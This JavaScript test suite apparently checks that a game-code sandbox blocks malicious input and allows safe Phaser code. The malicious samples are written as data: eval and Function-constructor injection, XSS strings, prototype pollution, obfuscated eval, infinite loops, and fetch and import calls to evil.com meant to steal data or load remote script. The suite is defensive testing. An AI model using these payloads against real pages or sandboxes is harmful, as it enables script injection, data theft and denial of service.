// Security Testing Suite for Game Code Validation
class SecurityTester {
    constructor() {
        this.testResults = [];
        this.maliciousCodeSamples = this.getMaliciousCodeSamples();
        this.benignCodeSamples = this.getBenignCodeSamples();
        this.executor = new SecureGameExecutor();
    }

    getMaliciousCodeSamples() {
        return [
            // Direct eval attacks
            {
                name: "Direct eval attack",
                code: `eval('alert("XSS Attack")');`,
                shouldFail: true,
                category: "Code Injection"
            },
            {
                name: "Indirect eval via window",
                code: `window['eval']('console.log("bypassed")');`,
                shouldFail: true,
                category: "Code Injection"
            },
            {
                name: "Eval with variable",
                code: `var x = eval; x('alert("attacked")');`,
                shouldFail: true,
                category: "Code Injection"
            },

            // Function constructor attacks
            {
                name: "Function constructor string execution",
                code: `new Function('alert("XSS")')();`,
                shouldFail: true,
                category: "Code Injection"
            },
            {
                name: "Function constructor with parameters",
                code: `Function('a', 'b', 'alert("XSS"); return a+b')(1,2);`,
                shouldFail: true,
                category: "Code Injection"
            },
            {
                name: "Hidden Function constructor",
                code: `var F = Function; F('console.log("bypassed")')();`,
                shouldFail: true,
                category: "Code Injection"
            },

            // Timer-based code injection
            {
                name: "setTimeout with string",
                code: `setTimeout('alert("XSS")', 1000);`,
                shouldFail: true,
                category: "Timer Injection"
            },
            {
                name: "setInterval with string",
                code: `setInterval('console.log("evil")', 1000);`,
                shouldFail: true,
                category: "Timer Injection"
            },

            // DOM manipulation attacks
            {
                name: "Document.write injection",
                code: `document.write('<script>alert("XSS")</script>');`,
                shouldFail: true,
                category: "DOM Manipulation"
            },
            {
                name: "Document.writeln injection",
                code: `document.writeln('<img src=x onerror=alert(1)>');`,
                shouldFail: true,
                category: "DOM Manipulation"
            },
            {
                name: "Document.body manipulation",
                code: `document.body.innerHTML = '<script>alert("XSS")</script>';`,
                shouldFail: true,
                category: "DOM Manipulation"
            },

            // Prototype pollution attacks
            {
                name: "Object prototype pollution",
                code: `Object.prototype.isAdmin = true;`,
                shouldFail: true,
                category: "Prototype Pollution"
            },
            {
                name: "__proto__ manipulation",
                code: `var obj = {}; obj.__proto__.polluted = true;`,
                shouldFail: true,
                category: "Prototype Pollution"
            },
            {
                name: "Constructor prototype access",
                code: `var x = {}; x.constructor.prototype.evil = function() { alert('pwned'); };`,
                shouldFail: true,
                category: "Prototype Pollution"
            },

            // Global object access
            {
                name: "Window object access",
                code: `window.location = 'http://evil.com';`,
                shouldFail: true,
                category: "Global Access"
            },
            {
                name: "Global this access",
                code: `(function() { return this; })().alert('XSS');`,
                shouldFail: true,
                category: "Global Access"
            },
            {
                name: "Self reference attack",
                code: `self.location = 'javascript:alert(1)';`,
                shouldFail: true,
                category: "Global Access"
            },

            // Storage attacks
            {
                name: "localStorage manipulation",
                code: `localStorage.setItem('evil', 'payload');`,
                shouldFail: true,
                category: "Storage Access"
            },
            {
                name: "sessionStorage manipulation",
                code: `sessionStorage.clear(); sessionStorage.setItem('hack', 'data');`,
                shouldFail: true,
                category: "Storage Access"
            },

            // Network/Import attacks
            {
                name: "Dynamic import",
                code: `import('http://evil.com/malicious.js');`,
                shouldFail: true,
                category: "Network Access"
            },
            {
                name: "Fetch request",
                code: `fetch('http://evil.com/steal-data');`,
                shouldFail: true,
                category: "Network Access"
            },
            {
                name: "XMLHttpRequest",
                code: `new XMLHttpRequest().open('GET', 'http://evil.com');`,
                shouldFail: true,
                category: "Network Access"
            },

            // Obfuscation attempts
            {
                name: "String concatenation obfuscation",
                code: `var evil = 'ev' + 'al'; window[evil]('alert("XSS")');`,
                shouldFail: true,
                category: "Obfuscation"
            },
            {
                name: "Unicode escape obfuscation",
                code: `\\u0065\\u0076\\u0061\\u006c('alert("XSS")');`,
                shouldFail: true,
                category: "Obfuscation"
            },
            {
                name: "Hex escape obfuscation",
                code: `\\x65\\x76\\x61\\x6c('alert("XSS")');`,
                shouldFail: true,
                category: "Obfuscation"
            },

            // Resource exhaustion
            {
                name: "Infinite loop",
                code: `while(true) { console.log('DoS'); }`,
                shouldFail: true,
                category: "Resource Exhaustion"
            },
            {
                name: "Memory exhaustion",
                code: `var arr = []; while(true) { arr.push(new Array(1000000)); }`,
                shouldFail: true,
                category: "Resource Exhaustion"
            },

            // Advanced evasion techniques
            {
                name: "toString method override",
                code: `var obj = {toString: function() { return 'alert("XSS")'; }}; eval(obj);`,
                shouldFail: true,
                category: "Advanced Evasion"
            },
            {
                name: "valueOf method override",
                code: `var obj = {valueOf: function() { eval('alert("XSS")'); return 1; }}; +obj;`,
                shouldFail: true,
                category: "Advanced Evasion"
            },
            {
                name: "Symbol.toPrimitive override",
                code: `var obj = {[Symbol.toPrimitive]: function() { eval('alert("XSS")'); return 1; }}; +obj;`,
                shouldFail: true,
                category: "Advanced Evasion"
            }
        ];
    }

    getBenignCodeSamples() {
        return [
            // Safe Phaser game code
            {
                name: "Basic Phaser game setup",
                code: `
var config = {
    type: Phaser.AUTO,
    width: 800,
    height: 600,
    scene: {
        create: function() {
            this.add.text(400, 300, 'Hello Phaser!', { fontSize: '32px', fill: '#000' });
        }
    }
};
var game = new Phaser.Game(config);`,
                shouldFail: false,
                category: "Safe Game Code"
            },
            
            // Safe function declarations
            {
                name: "Regular function declaration",
                code: `function createPlayer() { return { x: 0, y: 0, health: 100 }; }`,
                shouldFail: false,
                category: "Safe Functions"
            },
            {
                name: "Arrow function",
                code: `const movePlayer = (player, dx, dy) => { player.x += dx; player.y += dy; };`,
                shouldFail: false,
                category: "Safe Functions"
            },
            
            // Safe timers with function references
            {
                name: "setTimeout with function reference",
                code: `setTimeout(function() { console.log('Safe timer'); }, 1000);`,
                shouldFail: false,
                category: "Safe Timers"
            },
            {
                name: "setInterval with arrow function",
                code: `setInterval(() => { updateGame(); }, 16);`,
                shouldFail: false,
                category: "Safe Timers"
            },
            
            // Safe object manipulation
            {
                name: "Object property assignment",
                code: `var player = {}; player.health = 100; player.score = 0;`,
                shouldFail: false,
                category: "Safe Objects"
            },
            {
                name: "Array operations",
                code: `var enemies = []; enemies.push({x: 100, y: 100}); enemies.forEach(e => e.update());`,
                shouldFail: false,
                category: "Safe Objects"
            },
            
            // Safe math and logic
            {
                name: "Mathematical calculations",
                code: `var distance = Math.sqrt(Math.pow(dx, 2) + Math.pow(dy, 2));`,
                shouldFail: false,
                category: "Safe Math"
            },
            {
                name: "Conditional logic",
                code: `if (player.health <= 0) { gameOver(); } else { continue(); }`,
                shouldFail: false,
                category: "Safe Logic"
            }
        ];
    }

    async runAllTests() {
        console.log('🔒 Starting Security Test Suite...');
        this.testResults = [];

        // Test malicious code samples
        console.log('🚨 Testing malicious code samples...');
        for (const sample of this.maliciousCodeSamples) {
            await this.testCodeSample(sample);
        }

        // Test benign code samples
        console.log('✅ Testing benign code samples...');
        for (const sample of this.benignCodeSamples) {
            await this.testCodeSample(sample);
        }

        this.generateReport();
        return this.testResults;
    }

    async testCodeSample(sample) {
        const startTime = performance.now();
        let result = {
            name: sample.name,
            category: sample.category,
            shouldFail: sample.shouldFail,
            actualResult: null,
            passed: false,
            error: null,
            executionTime: 0,
            details: {}
        };

        try {
            // Test validation
            const validation = this.executor.validateCode(sample.code);
            result.actualResult = !validation.isValid;
            result.details.validationViolations = validation.violations || [];
            
            // Test execution if validation passes
            if (validation.isValid) {
                try {
                    this.executor.executeSecurely(sample.code);
                    result.details.executionSucceeded = true;
                } catch (execError) {
                    result.details.executionSucceeded = false;
                    result.details.executionError = execError.message;
                }
            }

            // Determine if test passed
            result.passed = (result.actualResult === sample.shouldFail);
            
        } catch (error) {
            result.error = error.message;
            result.actualResult = true; // Code was blocked
            result.passed = sample.shouldFail; // Pass if it should have failed
        }

        result.executionTime = performance.now() - startTime;
        this.testResults.push(result);

        // Log result
        const status = result.passed ? '✅ PASS' : '❌ FAIL';
        const expected = sample.shouldFail ? 'BLOCK' : 'ALLOW';
        const actual = result.actualResult ? 'BLOCKED' : 'ALLOWED';
        
        console.log(`${status} [${sample.category}] ${sample.name}`);
        console.log(`   Expected: ${expected}, Actual: ${actual}`);
        
        if (!result.passed) {
            console.log(`   ⚠️  SECURITY ISSUE: ${sample.name}`);
            if (result.error) console.log(`   Error: ${result.error}`);
        }
    }

    generateReport() {
        const totalTests = this.testResults.length;
        const passedTests = this.testResults.filter(r => r.passed).length;
        const failedTests = totalTests - passedTests;
        
        const maliciousTests = this.testResults.filter(r => r.shouldFail);
        const blockedMalicious = maliciousTests.filter(r => r.actualResult && r.passed).length;
        const missedMalicious = maliciousTests.filter(r => !r.actualResult && !r.passed).length;
        
        const benignTests = this.testResults.filter(r => !r.shouldFail);
        const allowedBenign = benignTests.filter(r => !r.actualResult && r.passed).length;
        const blockedBenign = benignTests.filter(r => r.actualResult && !r.passed).length;

        console.log('\n📊 SECURITY TEST REPORT');
        console.log('========================');
        console.log(`Total Tests: ${totalTests}`);
        console.log(`Passed: ${passedTests} (${(passedTests/totalTests*100).toFixed(1)}%)`);
        console.log(`Failed: ${failedTests} (${(failedTests/totalTests*100).toFixed(1)}%)`);
        console.log('');
        console.log('🚨 Malicious Code Detection:');
        console.log(`  Correctly Blocked: ${blockedMalicious}/${maliciousTests.length}`);
        console.log(`  Missed (CRITICAL): ${missedMalicious}/${maliciousTests.length}`);
        console.log('');
        console.log('✅ Benign Code Handling:');
        console.log(`  Correctly Allowed: ${allowedBenign}/${benignTests.length}`);
        console.log(`  False Positives: ${blockedBenign}/${benignTests.length}`);

        // Group failures by category
        const failuresByCategory = {};
        this.testResults.filter(r => !r.passed).forEach(result => {
            if (!failuresByCategory[result.category]) {
                failuresByCategory[result.category] = [];
            }
            failuresByCategory[result.category].push(result);
        });

        if (Object.keys(failuresByCategory).length > 0) {
            console.log('\n🔍 FAILURES BY CATEGORY:');
            Object.entries(failuresByCategory).forEach(([category, failures]) => {
                console.log(`\n${category}:`);
                failures.forEach(failure => {
                    console.log(`  ❌ ${failure.name}`);
                    if (failure.error) console.log(`     Error: ${failure.error}`);
                });
            });
        }

        // Critical security gaps
        const criticalGaps = this.testResults.filter(r => r.shouldFail && !r.actualResult);
        if (criticalGaps.length > 0) {
            console.log('\n🚨 CRITICAL SECURITY GAPS:');
            criticalGaps.forEach(gap => {
                console.log(`  ⚠️  ${gap.name} (${gap.category})`);
            });
        }

        return {
            totalTests,
            passedTests,
            failedTests,
            securityEffectiveness: blockedMalicious / maliciousTests.length,
            falsePositiveRate: blockedBenign / benignTests.length,
            criticalGaps: criticalGaps.length
        };
    }

    // Method to add custom test cases
    addCustomTest(name, code, shouldFail, category = 'Custom') {
        this.maliciousCodeSamples.push({ name, code, shouldFail, category });
    }

    // Method to test a single piece of code
    testSingleCode(code, shouldFail = true) {
        return this.testCodeSample({
            name: 'Custom Test',
            code: code,
            shouldFail: shouldFail,
            category: 'Manual Test'
        });
    }
}

// Make globally available
window.SecurityTester = SecurityTester;
